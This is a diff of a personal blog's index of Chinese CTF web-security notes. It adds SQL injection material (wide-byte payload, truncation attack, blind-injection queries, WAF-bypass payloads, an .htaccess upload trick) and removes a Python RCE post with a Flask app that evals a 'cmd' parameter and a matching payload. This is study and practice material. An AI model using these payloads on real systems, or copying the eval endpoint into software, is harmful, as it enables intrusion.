+<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><pre><code class="highlight plaintext">root %df&#x27; or 1=1 #
+# 原理:在GBK编码中,反斜杠的编码是%5c,在输入%df后，使得添加反斜杠后形成%df%5c，而%df%5c是繁体字“連”，单引号成功逃逸，爆出Mysql数据库的错误</code></pre>
+
+
+
+<h3 id="约束攻击"><a href="#约束攻击" class="headerlink" title="约束攻击"></a>约束攻击</h3><p>在SQL执行字符串处理操作时，字符串末尾的空格符将会被删除，换句话说”user”是等同于”user     “的，对于绝大多数的情况这两个相等都是成立的(像WHERE子句的字符串和INSERT语句中的字符串)</p>
+<blockquote>
+<p>[!WARNING]</p>
+<p>但是在像LIKE 子句中这是不成立的。因为对尾部空白符的这种修剪操作，主要是在“字符串比较”期间进行的。这是因为，SQL会在<a href="https://support.microsoft.com/en-in/kb/316626">内部</a>使用空格来填充字符串，以便在比较之前使其它们的长度保持一致</p>
+</blockquote>
+<p>在所有的INSERT查询中，SQL都会根据varchar(n)来限制字符串的最大长度。也就是说，如果字符串的长度大于“n”个字符的话，那么仅使用字符串的前“n”个字符。比如特定列的长度约束为“5”个字符，那么在插入字符串“vampire”时，实际上只能插入字符串的前5个字符，即“vampi”</p>
+<p><strong>攻击手段</strong></p>
+<p>注册一个用户名+一堆括号+1的用户名和自己的passwd(未超出长度限制的字符应该只包含已知的用户名和空白字符)</p>
+<p>注:在查询时，SQL是不会将字符串截断的。因此，使用完整的字符串进行搜索，所以不会找到匹配的结果。但当执行INSERT查询语句时，它只会插入被限制长度的字符。</p>
+<p>在攻击结束后，输入后来我们自己的密码和已给的用户名，会登录上原始用户</p>
+<pre><code class="highlight plaintext">解决办法:
+将要求或者预期具有唯一性的那些列加上UNIQUE约束。实际上这是一个涉及软件开发的重要规则，即使你的代码有维持其完整性的功能，也应该恰当的定义数据。由于’username’列具有UNIQUE约束，所以不能插入另一条记录。将会检测到两个相同的字符串，并且INSERT查询将失败。
+
+最好使用’id’作为数据库表的主键。并且数据应该通过程序中的id进行跟踪
+
+为了更加安全，还可以用手动调整输入参数的限制长度（依照数据库设置）</code></pre>
+
+
+
+<h2 id="Episode-3-在拿到flag的边缘疯狂试探-盲注"><a href="#Episode-3-在拿到flag的边缘疯狂试探-盲注" class="headerlink" title="Episode 3 在拿到flag的边缘疯狂试探:盲注"></a>Episode 3 在拿到flag的边缘疯狂试探:盲注</h2><p>(哈哈，盲注脚本吗，你问我，我只能说最好自己写一个，网上淘来的毕竟是别人的不如你自己搓的顺手)</p>
+<p>先确定注入型，再用and连接一下</p>
+<pre><code class="highlight sql">布尔盲注
+<span class="number">1.</span> length(database())<span class="operator">&gt;</span>??? 初步判断
+<span class="number">2.</span></code></pre>
+
+<h2 id="Episode-4-注入点-猜猜我在哪里呢"><a href="#Episode-4-注入点-猜猜我在哪里呢" class="headerlink" title="Episode 4 注入点:&gt;猜猜我在哪里呢"></a>Episode 4 注入点:&gt;猜猜我在哪里呢</h2><h3 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h3><h3 id="GET注入"><a href="#GET注入" class="headerlink" title="GET注入"></a>GET注入</h3><h3 id="Cookies注入"><a href="#Cookies注入" class="headerlink" title="Cookies注入"></a>Cookies注入</h3><h2 id="Episode-5-你好，绕WAF"><a href="#Episode-5-你好，绕WAF" class="headerlink" title="Episode   5  你好，绕WAF"></a>Episode   5  你好，绕WAF</h2><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>如过过滤了and和AND，试试And</p>
+<h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>如果waf把and替换为空</p>
+<p>然后可以使用<code>anandd</code>绕过</p>
+<h3 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h3><p>&#x2F;**&#x2F;  注释符号</p>
+<pre><code class="highlight plaintext">()-&gt;select(1),2,3</code></pre>
+
+<p>（）可以作为一个子语句查询存在,任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。所以就可以用()代替空格</p>
+<p>url编码绕过<code>%0a %20 %09 %0a %0b %0c %0d %a0</code>代替。</p>
+<h3 id="引号绕过"><a href="#引号绕过" class="headerlink" title="引号绕过"></a>引号绕过</h3><p>使用十六进制替代需要用到引号的语句，一般是在最后的查询语句</p>
+<h3 id="and和or绕过"><a href="#and和or绕过" class="headerlink" title="and和or绕过"></a>and和or绕过</h3><p>考虑管道符||表示or和&amp;&amp;表示and</p>
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="&#x3D;绕过"></a>&#x3D;绕过</h3><p>改成like或者&lt;或者&gt;</p>
+<p>还有<code>rlike 、regexp(正则匹配函数，‘’是直接找或包含，^是以什么开头,可以用[a-zA-Z]流氓匹配)</code></p>
+<h3 id="逗号过滤"><a href="#逗号过滤" class="headerlink" title="逗号过滤"></a>逗号过滤</h3><pre><code class="highlight sql"><span class="keyword">select</span> substr(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);
+#substr(str,pos,len)的功能是从pos开始的位置，截取len个字符；而无len就是直接截取到最后
+<span class="keyword">select</span> mid(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);
+#
+<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="operator">-</span><span class="operator">&gt;</span> <span class="operator">&lt;</span><span class="keyword">select</span> <span class="number">1</span><span class="operator">&gt;</span>a <span class="keyword">join</span> <span class="operator">&lt;</span><span class="keyword">select</span> <span class="number">2</span><span class="operator">&gt;</span>b <span class="keyword">join</span><span class="operator">&lt;</span><span class="keyword">select</span> <span class="number">3</span><span class="operator">&gt;</span>c <span class="keyword">join</span>
+<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> ((selcet1)A <span class="keyword">join</span> (select2)B <span class="keyword">join</span>(<span class="keyword">select</span> <span class="number">3</span>)C);
+limit <span class="number">0</span>,<span class="number">1</span><span class="operator">-</span><span class="operator">&gt;</span>limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span>;<span class="operator">/</span><span class="operator">/</span>等于limit <span class="number">0</span>,<span class="number">1</span> 从第<span class="number">1</span>行往后取<span class="number">0</span>行，只读第一行
+#limit <span class="number">1</span>,<span class="number">2</span> 指的是从第一行往后取<span class="number">2</span>行（包括第一行和第二行)；而limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">2</span>是从第一行开始只取第二行
+<span class="keyword">select</span> <span class="built_in">substring</span>(<span class="string">&#x27;hello&#x27;</span> <span class="keyword">from</span> <span class="number">1</span>);</code></pre>
+
+<h3 id="比较符号-绕过"><a href="#比较符号-绕过" class="headerlink" title="比较符号(&lt; &gt;)绕过"></a>比较符号(&lt; &gt;)绕过</h3><p>一般是盲注要用到捏</p>
+<p>最常见的一个盲注的sql语句：</p>
+<pre><code class="highlight plaintext">select * from users where id=1 and ascii(substr(database(),0,1))&gt;64</code></pre>
+
+<p>此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值。</p>
+<p>那么上面的这条sql语句可以使用greatest变为如下的子句:</p>
+<pre><code class="highlight plaintext">select*fromuserswhereid=1and greatest(ascii(substr(database(),0,1)),64)=64</code></pre>
+
+<h3 id="绕过关键字-union-select，where"><a href="#绕过关键字-union-select，where" class="headerlink" title="绕过关键字(union,select，where)"></a>绕过关键字(union,select，where)</h3><p>1）使用注释符绕过：</p>
+<p>常用注释符：</p>
+<p><code>//，-- , /**/, #(url编码一下还能用), --+, -- -, ;,%00,--a</code></p>
+<p>用法：</p>
+<p><code>U/**/NION/**/SE/**/LECT/**/user，pwd from user</code></p>
+<p>2）使用大小写绕过：</p>
+<p><code>id=-1&#39;UnIoN/**/SeLeCT</code></p>
+<p>3）内联注释绕过：</p>
+<p><code>id=-1&#39;/*!UnIoN*/SeLeCT1,2,concat(/*!table_name*/) FrOM/*information_schema*/.tables/*!WHERE*//*!TaBlE_ScHeMa*/like database()#</code></p>
+<p>4） 双关键字绕过：</p>
+<p><code>id=-1&#39;UNIunionONSeLselectECT1,2,3–-</code></p>
+<h3 id="通用编码绕过"><a href="#通用编码绕过" class="headerlink" title="通用编码绕过"></a>通用编码绕过</h3><p>如URLEncode编码，ASCII,HEX,unicode编码绕过：</p>
+<p>or1&#x3D;1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</p>
+<h3 id="等价函数绕过"><a href="#等价函数绕过" class="headerlink" title="等价函数绕过"></a>等价函数绕过</h3><p>hex()、bin()&#x3D;&#x3D;&gt;ascii()</p>
+<p>sleep()&#x3D;&#x3D;&gt;benchmark()</p>
+<p>concat_ws()&#x3D;&#x3D;&gt;group_concat()</p>
+<p>mid()、substr()&#x3D;&#x3D;&gt;substring() @@user&#x3D;&#x3D;&gt;user() @@datadir&#x3D;&#x3D;&gt;datadir()</p>
+<p>举例：substring()和substr()无法使用时：?id&#x3D;1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))&#x3D;74或者：</p>
+<p>substr((select’password’),1,1)&#x3D;0x70strcmp(left(‘password’,1),0x69)&#x3D;1strcmp(left(‘password’,1),0x70)&#x3D;0strcmp(left(‘password’,1),0x71)&#x3D;-1</p>
+<h3 id="长度限制绕过"><a href="#长度限制绕过" class="headerlink" title="长度限制绕过"></a>长度限制绕过</h3><p>网页显示常常只能给出有限长度的字母，这个时候就要通过一些函数来绕过</p>
+<pre><code class="highlight sql"><span class="number">1</span>、<span class="keyword">left</span>（<span class="number">201809</span>,<span class="number">4</span>）截取左边的<span class="number">4</span>个字符
+<span class="keyword">SELECT</span> <span class="keyword">LEFT</span>(<span class="number">201809</span>,<span class="number">4</span>)    <span class="operator">/</span><span class="operator">/</span>结果：<span class="number">2018</span>
+
+<span class="number">2</span>、<span class="keyword">right</span>（name,<span class="number">2</span>）截取右边的<span class="number">2</span>个字符
+<span class="keyword">SELECT</span> <span class="keyword">RIGHT</span>(<span class="number">201809</span>,<span class="number">2</span>)    <span class="operator">/</span><span class="operator">/</span>结果：<span class="number">09</span>
+
+<span class="number">3</span>、<span class="built_in">SUBSTRING</span>(name,<span class="number">5</span>,<span class="number">3</span>) 截取name这个字段 从第五个字符开始 只截取之后的<span class="number">3</span>个字符
+<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(<span class="string">&#x27;成都融资事业部&#x27;</span>,<span class="number">5</span>,<span class="number">3</span>)   <span class="operator">/</span><span class="operator">/</span>结果：事业部
+
+<span class="number">4</span>、<span class="built_in">SUBSTRING</span>(name,<span class="number">3</span>) 截取name这个字段 从第三个字符开始，之后的所有个字符
+<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(<span class="string">&#x27;成都融资事业部&#x27;</span>,<span class="number">3</span>)   <span class="operator">/</span><span class="operator">/</span>结果：融资事业部
+
+<span class="number">5</span>、<span class="built_in">SUBSTRING</span>(name, <span class="number">-4</span>) 截取name这个字段的第 <span class="number">4</span> 个字符位置（倒数）开始取，直到结束
+<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(<span class="string">&#x27;成都融资事业部&#x27;</span>,<span class="number">-4</span>)   <span class="operator">/</span><span class="operator">/</span>结果：资事业部
+
+<span class="number">6</span>、<span class="built_in">SUBSTRING</span>(name, <span class="number">-4</span>，<span class="number">2</span>) 截取name这个字段的第 <span class="number">4</span> 个字符位置（倒数）开始取，只截取之后的<span class="number">2</span>个字符
+<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(<span class="string">&#x27;成都融资事业部&#x27;</span>,<span class="number">-4</span>,<span class="number">2</span>)   <span class="operator">/</span><span class="operator">/</span>结果：资事
+注意：我们注意到在函数 <span class="built_in">substring</span>(str,pos, len)中， pos 可以是负值，但 len 不能取负值。
+
+<span class="number">7</span>、substring_index(<span class="string">&#x27;www.baidu.com&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="number">2</span>) 截取第二个 <span class="string">&#x27;.&#x27;</span> 之前的所有字符
+<span class="keyword">SELECT</span> substring_index(<span class="string">&#x27;www.baidu.com&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="number">2</span>)   <span class="operator">/</span><span class="operator">/</span>结果：www.baidu
+
+<span class="number">8</span>、substring_index(<span class="string">&#x27;www.baidu.com&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="number">-2</span>) 截取第二个 <span class="string">&#x27;.&#x27;</span> （倒数）之后的所有字符
+<span class="keyword">SELECT</span> substring_index(<span class="string">&#x27;www.baidu.com&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="number">-2</span>)   <span class="operator">/</span><span class="operator">/</span>结果：baidu.com
+
+<span class="number">9</span>、SUBSTR(name, <span class="number">1</span>, <span class="keyword">CHAR_LENGTH</span>(name)<span class="number">-3</span>) 截取name字段，取除name字段后三位的所有字符
+<span class="keyword">SELECT</span> SUBSTR(<span class="string">&#x27;成都融资事业部&#x27;</span>, <span class="number">1</span>, <span class="keyword">CHAR_LENGTH</span>(<span class="string">&#x27;成都融资事业部&#x27;</span>)<span class="number">-3</span>)            <span class="operator">/</span><span class="operator">/</span>结果：成都融资
+
+<span class="number">10</span>、mid(str,<span class="keyword">start</span>,[length])
+str:截取的字符串   <span class="keyword">start</span>:起始位置   length:截取的长度，可以忽略
+
+<span class="number">11.</span>reverse(concat(<span class="number">0x3a</span>，(<span class="keyword">select</span>(group_concat(real_flag_1s_here))<span class="keyword">from</span>(users)<span class="keyword">where</span>(real_flag_1s_here)regexp(<span class="string">&#x27;^f&#x27;</span>))))
+用reverse倒序输出，有时候有奇效。?大概吧</code></pre>
+
+
+
+<h2 id="Episode-6-模糊匹配"><a href="#Episode-6-模糊匹配" class="headerlink" title="Episode 6  模糊匹配"></a>Episode 6  模糊匹配</h2><p>SQL模糊查询，使用like比较关键字，加上SQL里的通配符，请参考以下：</p>
+<p>1、LIKE’Mc%’ 将搜索以字母 Mc 开头的所有字符串（如 McBadden）。</p>
+<p>2、LIKE’%inger’ 将搜索以字母 inger 结尾的所有字符串（如 Ringer、Stringer）</p>
+<p>3、LIKE’%en%’ 将搜索在任何位置包含字母 en 的所有字符串（如 Bennet、Green、McBadden）。</p>
+<p>4、LIKE’_heryl’ 将搜索以字母 heryl 结尾的所有六个字母的名称（如 Cheryl、Sheryl）。</p>
+<p>5、LIKE’[CK]ars[eo]n’ 将搜索下列字符串：Carsen、Karsen、Carson 和 Karson（如 Carson）。</p>
+<p>6、LIKE’[M-Z]inger’ 将搜索以字符串 inger 结尾、以从 M 到 Z 的任何单个字母开头的所有名称（如 Ringer）。</p>
+<p>7、LIKE’M[^c]%’ 将搜索以字母 M 开头，并且第二个字母不是 c 的所有名称（如MacFeather）。</p>
+<h2 id="Episode-7-奇奇怪怪的知识点积累"><a href="#Episode-7-奇奇怪怪的知识点积累" class="headerlink" title="Episode   7 奇奇怪怪的知识点积累"></a>Episode   7 奇奇怪怪的知识点积累</h2><p><strong>短路算法：</strong></p>
+<p>|| 逻辑或的短路：a||b</p>
+<p>计算机发现a是真，那么输出a；如果a是假，那么输出b</p>
+<p>select 1 from ：建立一个临时列，这个列的所有初始值都被设为1。如果发现select后面跟有||就可以构造1 ||(sql语句) 用来无效化后方语句。</p>
+<p><strong>WITH ROLLUP:</strong>(来自ctfshow web10)</p>
+<pre><code class="highlight plaintext">语法:group by xxx with rollup</code></pre>
+
+<p>with rollup是对前面数据的一次汇总，此时在查询的数据中会被插入一行值为NULL,此时即可绕过长度检验，前提你要知道在哪个表并且没有对第二个字段是否输入的前端检查</p>
+<p><strong>联合查询伪造</strong></p>
+<p>通过联合查询，你可以伪造一段没有的数据(即临时数据)</p>
+<p>因为union select会把查询结果接在前一个查询结果后面，前面如果查到了东西，那么取得还是第一行</p>
+<p>那么通过让前面查不到，回显我们的注入语句就能够达到注入目的(呃呃，感觉有点像二次注入的后面半段)</p>
+<p>这里直接应用别的师傅打好的案例</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250330124245041.png" alt="image-20250330124245041"></p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250330124258559.png" alt="image-20250330124258559"></p>
+<p>那么只要知道username所在的列就可以直接糊弄过密码的检测了</p>
+<h2 id="Episode-8-一点感想"><a href="#Episode-8-一点感想" class="headerlink" title="Episode   8 一点感想"></a>Episode   8 一点感想</h2><p>刷了一些题目，发现最重要的其实是注入点的判断(除非是万恶的盲注，那重点可能更在脚本上)</p>
+<p>[参考文章]: <a href="https://www.cnblogs.com/ECJTUACM-873284962/p/8977983.html">https://www.cnblogs.com/ECJTUACM-873284962/p/8977983.html</a>	“基于约束的SQL攻击 - Angel_Kitty - 博客园”<br>[参考文章]: <a href="https://www.cnblogs.com/icui4cu/p/15136893.html">https://www.cnblogs.com/icui4cu/p/15136893.html</a>	“宽字节注入原理及绕过方式”</p>
+]]></content>
+      <tags>
+        <tag>-web -CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件上传漏洞</title>
+    <url>/2025/01/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>题型：</p>
+<p>弱判断:bp改一下就能过</p>
+<p>增加文件头</p>
+<p>改phtml绕过</p>
+<p>利用.user.ini配置文件或者.htaccess配合攻击(必须用特定文件后缀名时)</p>
+<p>.htaccess：内容如下（功能是将.jpeg文件解析为php文件）：</p>
+<pre><code class="highlight plaintext">AddType application/x-httpd-php .jpg</code></pre>
 ]]></content>
       <tags>
         <tag>-CTF -Web</tag>
@@ -3291,457 +3742,6 @@ hr &#123;<span class="attribute">color</span>:sienna;&#125;
 <h2 id="XSS-BOT"><a href="#XSS-BOT" class="headerlink" title="XSS BOT"></a>XSS BOT</h2><h2 id="WAF-Bypass"><a href="#WAF-Bypass" class="headerlink" title="WAF Bypass"></a>WAF Bypass</h2>]]></content>
       <tags>
         <tag>-CTF -Web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>python的RCE姿势以及内存马注入</title>
-    <url>/2025/03/25/python%E7%9A%84RCE%E5%A7%BF%E5%8A%BF%E4%BB%A5%E5%8F%8A%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h1 id="python的rce姿势以及内存马注入"><a href="#python的rce姿势以及内存马注入" class="headerlink" title="python的rce姿势以及内存马注入"></a>python的rce姿势以及内存马注入</h1><p>python的SSTI是明白的，可是如果是先渲染再接受参数呢?只传参不渲染又该如何面对呢</p>
-<p>诶，注入一个内存马试试.?</p>
-<h2 id="Python-的命令执行"><a href="#Python-的命令执行" class="headerlink" title="Python 的命令执行"></a>Python 的命令执行</h2><p>不同于php自带的命令执行函数，python是要先引入模块的，参考jinja2模板注入找os内置函数的那个过程</p>
-<h3 id="OS模块"><a href="#OS模块" class="headerlink" title="OS模块"></a>OS模块</h3><p>经典款:</p>
-<h4 id="os-system"><a href="#os-system" class="headerlink" title="os.system:"></a><code>os.system</code>:</h4><p>可以用来执行系统命令,但是无法将系统命令执行的结果返回.如果执行成功了会返回0,失败了会返回1</p>
-<pre><code class="highlight python"><span class="keyword">import</span> os
-os.system(<span class="string">&#x27;dir&#x27;</span>)  //输出目录结构
-<span class="built_in">print</span>(os.system(<span class="string">&#x27;dir&#x27;</span>))  //输出目录结构,下一行输出<span class="number">0</span></code></pre>
-
-<h4 id="os-popen"><a href="#os-popen" class="headerlink" title="os.popen:"></a><code>os.popen</code>:</h4><p>可以用来将系统命令执行的结构存储到一个管道文件中(什么是管道文件?个人理解是类似php中的phar这种).然后可以通过read方法来将管道文件的内容返回</p>
-<pre><code class="highlight python"><span class="keyword">import</span> os
-out=os.popen(<span class="string">&#x27;dir&#x27;</span>)
-<span class="built_in">print</span>(out.read())</code></pre>
-
-<h3 id="subprocess模块"><a href="#subprocess模块" class="headerlink" title="subprocess模块"></a>subprocess模块</h3><p>可以认为subprocess是os模块的安全版</p>
-<h4 id="subprocess-run"><a href="#subprocess-run" class="headerlink" title="subprocess.run:"></a><code>subprocess.run</code>:</h4><p>基本是subprocess中最常用的模块,包含下列参数</p>
-<pre><code class="highlight python">subprocess.run(args, *, stdin=<span class="literal">None</span>, <span class="built_in">input</span>=<span class="literal">None</span>, stdout=<span class="literal">None</span>, stderr=<span class="literal">None</span>, capture_output=<span class="literal">False</span>, shell=<span class="literal">False</span>, cwd=<span class="literal">None</span>, timeout=<span class="literal">None</span>, check=<span class="literal">False</span>, encoding=<span class="literal">None</span>, errors=<span class="literal">None</span>, text=<span class="literal">None</span>, env=<span class="literal">None</span>, universal_newlines=<span class="literal">None</span>)</code></pre>
-
-<hr>
-<pre><code class="highlight plaintext">1.唯一一个必须要有的参数,为一个字符串列表/字符串,其中第一个值是一个应用程序,后面的则是传递的参数</code></pre>
-
-<pre><code class="highlight python"><span class="keyword">import</span> subprocess
-out=subprocess.run([<span class="string">&quot;calc.exe&quot;</span>,<span class="string">&quot;-p&quot;</span>],capture_output=<span class="literal">True</span>,text=<span class="literal">True</span>)
-<span class="built_in">print</span>(out.stdout)</code></pre>
-
-<p>这也是我们常说的弹计算器命令,但是需要注意,由于windows并不是像linux那样由纯文件组成,所以这里的列表中无法直接使用dir命令如<code>[&quot;dir&quot;]</code>(本质上这个dir是传递给windows.cmd的一个参数,但是这个windows.cmd程序的位置找不到)</p>
-<hr>
-<pre><code class="highlight plaintext">2.shell=True,默认为false</code></pre>
-
-<p>用于控制是否允许在第一个参数处直接使用shell命令的,开启后则可以不使列表而是以字符串形式直接使用,如:</p>
-<pre><code class="highlight python"><span class="keyword">import</span> subprocess
-out=subprocess.run(<span class="string">&quot;dir&quot;</span>,shell=<span class="literal">True</span>,capture_output=<span class="literal">True</span>,text=<span class="literal">True</span>)
-<span class="built_in">print</span>(out.stdout)</code></pre>
-
-<p>复现效果：</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250325184321691.png" alt="image-20250325184321691"></p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250325184555941.png" alt="image-20250325184555941"></p>
-<hr>
-<pre><code class="highlight plaintext">3.stdin,stdout,stderr,默认为false</code></pre>
-
-<p>这三个参数用来设置输入,输出和错误信息为管道对象或是类文件对象,这里不常用.</p>
-<hr>
-<pre><code class="highlight plaintext">4.capture_output=true,默认为false</code></pre>
-
-<p>用于捕获stdout和stderr时期不会输出到终端而是作为一个对象来返回.</p>
-<hr>
-<pre><code class="highlight plaintext">5.text=true,默认为false</code></pre>
-
-<p>默认状态下返回的数据为字节流,而<code>text=true</code>可以使得返回的数据为字符串而不是字节流,不用人手动转换.</p>
-<hr>
-<pre><code class="highlight plaintext">6.encoding=&#x27;utf-8&#x27;</code></pre>
-
-<p>如果指定了参数,则stdin,stdout,stderr可以接受该类型的数据,否则默认为字节流.可以认为是<code>text=true</code>的一个手动选择版</p>
-<hr>
-<pre><code class="highlight plaintext">7.timeout</code></pre>
-
-<p>设置命令超时时间.如果命令执行时间超时,子进程将被杀死,并弹出 <code>TimeoutExpired</code>异常.</p>
-<hr>
-<pre><code class="highlight plaintext">8.check=true</code></pre>
-
-<p>如果该参数设置为<code>True</code>,并且进程退出状态码不是0,则弹出<code>CalledProcessError</code>异常.</p>
-<h4 id="subprocess-Popen"><a href="#subprocess-Popen" class="headerlink" title="subprocess.Popen"></a><code>subprocess.Popen</code></h4><p>是subprocess方法的核心,可用于实现更为复杂的功能</p>
-<p>具体介绍就不给了，给两个大佬的博客自己选择着看看把(</p>
-<p><a href="https://www.cnblogs.com/-qing-/p/10934322.html">Python之subprocess模块 - 卿先生 - 博客园</a></p>
-<p><a href="https://www.cnblogs.com/yifengyu/p/16115712.html">python中的subprocess.Popen()、PIPE使用详解 - 平行时空的旅者 - 博客园</a></p>
-<p>直接开始本地复现</p>
-<pre><code class="highlight plaintext">import  subprocess
-p = subprocess.Popen(&quot;dir&quot;, shell=True,encoding=&quot;utf-8&quot;)</code></pre>
-
-<p>在linux成功复现</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250325191600985.png" alt="image-20250325191600985"></p>
-<p>反观windows(</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250325191725159.png" alt="image-20250325191725159"></p>
-<p>修了一下，是编码问题+一个stdout和stderr未重定向到PIPE的问题</p>
-<p>修了一下成功读取</p>
-<pre><code class="highlight python"><span class="keyword">import</span>  subprocess
-p = subprocess.Popen(<span class="string">&quot;dir&quot;</span>, shell=<span class="literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE, encoding=<span class="string">&quot;gbk&quot;</span>)
-
-stdout, stderr = p.communicate()
-
-<span class="built_in">print</span>(stdout)</code></pre>
-
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250325191538567.png" alt="image-20250325191538567"></p>
-<h4 id="subprocess-getoutput"><a href="#subprocess-getoutput" class="headerlink" title="subprocess.getoutput"></a><code>subprocess.getoutput</code></h4><p>接收字符串格式的命令，执行命令并返回执行结果，其功能类似于os.popen(cmd).read()和commands.getoutput(cmd)。</p>
-<p>用于执行系统命令,并将stdout和stderr直接捕获(不输出到终端)并以字符串形式返回</p>
-<pre><code class="highlight python"><span class="keyword">import</span> os
-<span class="keyword">import</span> subprocess
-out=subprocess.getoutput(<span class="string">&quot;dir&quot;</span>) <span class="comment"># 到这还没有输出</span>
-<span class="built_in">print</span>(out) <span class="comment">#到这才有的输出</span></code></pre>
-
-<h4 id="subprocess-check-output"><a href="#subprocess-check-output" class="headerlink" title="subprocess.check_output"></a><code>subprocess.check_output</code></h4><p>可以理解为<code>subprocess.run</code>和<code>subprocess.getoutput</code>的结合版.会将stdout捕获作为字符串返回,同时也可以像<code>subprocess.run</code>一样使用较为复杂的自定义功能.</p>
-<pre><code class="highlight python"><span class="keyword">import</span> subprocess
-out=subprocess.check_output(<span class="string">&quot;dir&quot;</span>,shell=<span class="literal">True</span>,text=<span class="literal">True</span>)<span class="comment"># 到这还没有输出</span>
-<span class="built_in">print</span>(out) <span class="comment">#到这才有的输出</span></code></pre>
-
-<h4 id="subprocess-call-及check-call"><a href="#subprocess-call-及check-call" class="headerlink" title="subprocess.call() 及check_call()"></a><code>subprocess.call() </code>及<code>check_call()</code></h4><p><code>subprocess.call() </code>为python3.5以前版本使用,与<code>subprocess.run()</code>用法基本一致,但call()返回的为命令结束码,无法获取更多信息,不推荐使用,现已被run()取代.<br><code>subprocess.check_call() </code>与<code>call()</code>的区别为,<code>check_call()</code>如果命令失败(即 returncode不为0)会主动抛出<code>subprocess.CalledProcessError</code>异常,使用<code>subprocess.run(check=True)</code>可取代<code>subprocess.check_call()</code>.</p>
-<h3 id="send-file"><a href="#send-file" class="headerlink" title="send_file"></a>send_file</h3><p>是类似于<code>render_template</code>和<code>redirect</code>的一种用于前后端交互的方法,可以下载指定的文件.</p>
-<pre><code class="highlight python"><span class="keyword">import</span> os
-<span class="keyword">import</span> subprocess
-<span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for,session, send_file, Response
-app = Flask(__name__)
-<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span>
-<span class="keyword">def</span> <span class="title function_">index</span>():
-    <span class="keyword">return</span> send_file(<span class="string">&#x27;D:\\114514.docx&#x27;</span>)
-<span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:
-    app.run(debug=<span class="literal">True</span>, host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">5000</span>)</code></pre>
-
-<h3 id="eval和exec"><a href="#eval和exec" class="headerlink" title="eval和exec"></a>eval和exec</h3><p>eval()和 exec()函数的功能是相似的,都可以执行一个字符串形式的 Python代码(代码以字符串的形式提供),相当于一个Python的解释器.二者不同之处在于,eval()执行完要返回结果,而exec()执行完不返回结果.</p>
-<pre><code class="highlight python"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, send_file
-app = Flask(__name__)
-<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span>
-<span class="keyword">def</span> <span class="title function_">index</span>():
-    <span class="keyword">if</span> <span class="keyword">not</span> request.args.get(<span class="string">&quot;cmd&quot;</span>):
-        <span class="keyword">return</span> send_file(<span class="string">&quot;app.py&quot;</span>)
-    <span class="keyword">else</span>:
-        cmd=request.args.get(<span class="string">&quot;cmd&quot;</span>)
-        res=<span class="built_in">eval</span>(cmd)
-        <span class="keyword">return</span> res
-<span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:
-    app.run(debug=<span class="literal">True</span>, host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">5000</span>)</code></pre>
-
-<p>payload:</p>
-<pre><code class="highlight python">?cmd=<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(<span class="string">&quot;ls%20/&quot;</span>).read()
